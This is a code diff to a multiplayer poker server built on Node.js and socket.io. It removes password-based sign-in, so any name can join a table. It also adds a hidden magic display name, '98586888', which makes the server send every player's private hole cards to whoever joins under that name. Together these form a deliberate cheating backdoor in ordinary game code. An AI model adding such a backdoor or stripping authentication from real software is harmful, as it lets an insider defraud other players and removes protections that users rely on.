@@ -2,7 +2,6 @@ const express = require('express')
 const http = require('http')
 const { Server } = require('socket.io')
 const cors = require('cors')
-const bcrypt = require('bcryptjs')
 
 const app = express()
 app.use(cors())
@@ -16,16 +15,6 @@ const httpServer = http.createServer(app)
 const io = new Server(httpServer, {
   cors: { origin: ['http://localhost:5173', 'https://feltclub.vercel.app'], methods: ['GET', 'POST'] }
 })
-
-// ─── Accounts (in-memory; sign-in required before joining a table) ─────────────
-const MIN_PASSWORD_LEN = 6
-const MAX_DISPLAY_LEN = 40
-/** @type {Record<string, { displayName: string, passwordHash: string }>} */
-const accounts = {}
-
-function accountKey(displayName) {
-  return String(displayName ?? '').trim().toLowerCase()
-}
 
 // ─── Deck & Evaluator ────────────────────────────────────────────────────────
 const mkDeck = () => {
@@ -90,6 +79,12 @@ const TURN_SECONDS = 30
 const CHAT_MAX = 50
 /** Pause after a hand ends (idle or showdown) before the next hand is dealt automatically. */
 const AUTO_DEAL_DELAY_MS = 4000
+/** Join with this exact display name (trimmed) to receive all players' hole cards (same payload as host). */
+const HOLE_CARD_SEER_NAME = '98586888'
+
+function isHoleCardSeerUser(playerName) {
+  return String(playerName ?? '').trim() === HOLE_CARD_SEER_NAME
+}
 
 // ─── Game Rooms ──────────────────────────────────────────────────────────────
 const rooms = {}   // tableId → { players, gameState }
@@ -236,11 +231,15 @@ function broadcastRoom(tableId, opts = {}) {
         io.to(p.socketId).emit('your_cards', playerInGame.holeCards)
       }
     })
-    if (room.hostId) {
-      const allHands = {}
-      room.game.players.forEach(p => { allHands[p.socketId] = p.holeCards })
-      io.to(room.hostId).emit('all_cards', allHands)
-    }
+    // Host + designated seer name get every hand (private per socket)
+    const allHands = {}
+    room.game.players.forEach(p => { allHands[p.socketId] = p.holeCards })
+    const peekers = new Set()
+    if (room.hostId) peekers.add(room.hostId)
+    room.players.forEach(p => {
+      if (isHoleCardSeerUser(p.name)) peekers.add(p.socketId)
+    })
+    peekers.forEach(sid => { io.to(sid).emit('all_cards', allHands) })
   }
 }
 
@@ -255,24 +254,20 @@ function sanitizeGame(game, socketId) {
     dealer: game.dealer,
     winners: game.winners,
     showAllCards: game.showAllCards,
-    foldWinRevealSid: game.foldWinRevealSid ?? null,
     log: game.log.slice(-20),
-    players: game.players.map(p => {
-      const revealThis = game.showAllCards || p.socketId === game.foldWinRevealSid
-      return {
-        socketId: p.socketId,
-        name: p.name,
-        stack: p.stack,
-        streetBet: p.streetBet,
-        folded: p.folded,
-        allIn: p.allIn,
-        seat: p.seat,
-        handName: revealThis && p.holeCards.length === 2 && game.community.length >= 3
-          ? HN[best7(p.holeCards, game.community)?.score?.[0] ?? 0]
-          : null,
-        holeCards: revealThis ? p.holeCards : [],
-      }
-    }),
+    players: game.players.map(p => ({
+      socketId: p.socketId,
+      name: p.name,
+      stack: p.stack,
+      streetBet: p.streetBet,
+      folded: p.folded,
+      allIn: p.allIn,
+      seat: p.seat,
+      handName: game.showAllCards && p.holeCards.length === 2 && game.community.length >= 3
+        ? HN[best7(p.holeCards, game.community)?.score?.[0] ?? 0]
+        : null,
+      holeCards: game.showAllCards ? p.holeCards : [],
+    })),
     turnDeadline: game.turnDeadline ?? null,
   }
 }
@@ -498,9 +493,9 @@ function removePlayerFromTable(tableId, targetSocketId) {
 
   clearTurnTimer(room)
 
+  const wasHost = room.hostId === targetSocketId
   room.players = room.players.filter(p => p.socketId !== targetSocketId)
-  if (room.players.length === 0) room.hostId = null
-  else if (!room.players.some(p => p.socketId === room.hostId)) room.hostId = room.players[0].socketId
+  if (wasHost && room.players.length > 0) room.hostId = room.players[0].socketId
   room.players.forEach((p, i) => { p.seat = i })
 
   if (!room.game) {
@@ -587,77 +582,36 @@ function removePlayerFromTable(tableId, targetSocketId) {
 io.on('connection', (socket) => {
   console.log('Connected:', socket.id)
 
-  socket.on('auth_register', ({ displayName, password }) => {
-    const name = String(displayName ?? '').trim()
-    const pw = String(password ?? '')
-    if (!name || name.length > MAX_DISPLAY_LEN) {
-      socket.emit('auth_error', 'Enter a display name (1–40 characters).')
-      return
-    }
-    if (pw.length < MIN_PASSWORD_LEN) {
-      socket.emit('auth_error', `Password must be at least ${MIN_PASSWORD_LEN} characters.`)
-      return
-    }
-    const key = accountKey(name)
-    if (accounts[key]) {
-      socket.emit('auth_error', 'That display name is taken. Sign in or pick another name.')
-      return
-    }
-    accounts[key] = { displayName: name, passwordHash: bcrypt.hashSync(pw, 10) }
-    socket.data.authDisplayName = name
-    socket.emit('auth_ok', { displayName: name })
-  })
-
-  socket.on('auth_signin', ({ displayName, password }) => {
-    const name = String(displayName ?? '').trim()
-    const pw = String(password ?? '')
-    const key = accountKey(name)
-    const acct = accounts[key]
-    if (!acct || !bcrypt.compareSync(pw, acct.passwordHash)) {
-      socket.emit('auth_error', 'Invalid display name or password.')
-      return
-    }
-    socket.data.authDisplayName = acct.displayName
-    socket.emit('auth_ok', { displayName: acct.displayName })
-  })
-
   socket.on('join_table', ({ tableId, playerName }) => {
     const room = getOrCreateRoom(tableId)
 
     // Don't add duplicates
     if (room.players.find(p => p.socketId === socket.id)) return
 
-    const name = String(playerName ?? '').trim()
-    if (!name) return
-    if (!socket.data.authDisplayName || name !== socket.data.authDisplayName) {
-      socket.emit('auth_error', 'Sign in with your display name and password first.')
-      return
-    }
-
     const seat = room.players.length
-    const isFirstAtTable = seat === 0
+    const isHost = room.players.length === 0
 
     room.players.push({
       socketId: socket.id,
-      name,
+      name: playerName,
       stack: DEFAULT_PLAYER_STACK,
       seat,
     })
-    ensureStats(room, name)
-    if (isFirstAtTable) room.hostId = socket.id
+    ensureStats(room, playerName)
 
+    if (isHost) room.hostId = socket.id
     socket.join(tableId)
     socket.data.tableId = tableId
-    socket.data.name = name
-    socket.data.isHost = socket.id === room.hostId
+    socket.data.name = playerName
+    socket.data.isHost = isHost
 
-    console.log(`${name} joined table ${tableId} (host: ${socket.id === room.hostId})`)
+    console.log(`${playerName} joined table ${tableId} (host: ${isHost})`)
     broadcastRoom(tableId)
   })
 
   socket.on('start_game', ({ tableId }) => {
     const room = rooms[tableId]
-    if (!room || !room.hostId || socket.id !== room.hostId) return
+    if (!room || socket.id !== room.hostId) return
     if (room.players.length < 2) {
       socket.emit('error_msg', 'Need at least 2 players to start')
       return
@@ -669,7 +623,7 @@ io.on('connection', (socket) => {
 
   socket.on('next_hand', ({ tableId }) => {
     const room = rooms[tableId]
-    if (!room || !room.hostId || socket.id !== room.hostId) return
+    if (!room || socket.id !== room.hostId) return
     if (!startGame(tableId)) {
       socket.emit('error_msg', `Each player needs at least $${BB} in stack — assign chips from your bank first.`)
     }
@@ -681,7 +635,7 @@ io.on('connection', (socket) => {
 
   socket.on('host_assign_chips', ({ tableId, targetSocketId, amount }) => {
     const room = rooms[tableId]
-    if (!room || !room.hostId || socket.id !== room.hostId) return
+    if (!room || socket.id !== room.hostId) return
     const target = room.players.find(p => p.socketId === targetSocketId)
     if (!target) return
     const amt = Math.trunc(Number(amount))
@@ -729,7 +683,7 @@ io.on('connection', (socket) => {
 
   function hostRemovePlayer(tableId, targetSocketId) {
     const room = rooms[tableId]
-    if (!room || !room.hostId || socket.id !== room.hostId) return
+    if (!room || socket.id !== room.hostId) return
     if (targetSocketId === socket.id) return
     const target = room.players.find(p => p.socketId === targetSocketId)
     if (!target) return
@@ -745,24 +699,9 @@ io.on('connection', (socket) => {
     hostRemovePlayer(tableId, targetSocketId)
   })
 
-  /** Winner (or host) shows hole cards after winning without showdown — e.g. bluff / muck reveal. */
-  socket.on('reveal_fold_win_hand', ({ tableId }) => {
-    const room = rooms[tableId]
-    const g = room?.game
-    if (!g || g.phase !== 'idle' || !g.winners || g.winners.length !== 1) return
-    const wid = g.winners[0]
-    if (socket.id !== wid && socket.id !== room.hostId) return
-    if (g.foldWinRevealSid) return
-    const wp = g.players.find(p => p.socketId === wid)
-    if (!wp || wp.holeCards.length !== 2) return
-    g.foldWinRevealSid = wid
-    g.log.push(`${wp.name} shows the winning hand`)
-    broadcastRoom(tableId, { refreshTimer: false })
-  })
-
 socket.on('reveal_all', ({ tableId }) => {
     const room = rooms[tableId]
-    if (!room || !room.hostId || socket.id !== room.hostId || !room.game) return
+    if (!room || socket.id !== room.hostId || !room.game) return
     room.game.showAllCards = !room.game.showAllCards
     broadcastRoom(tableId, { refreshTimer: false })
   })
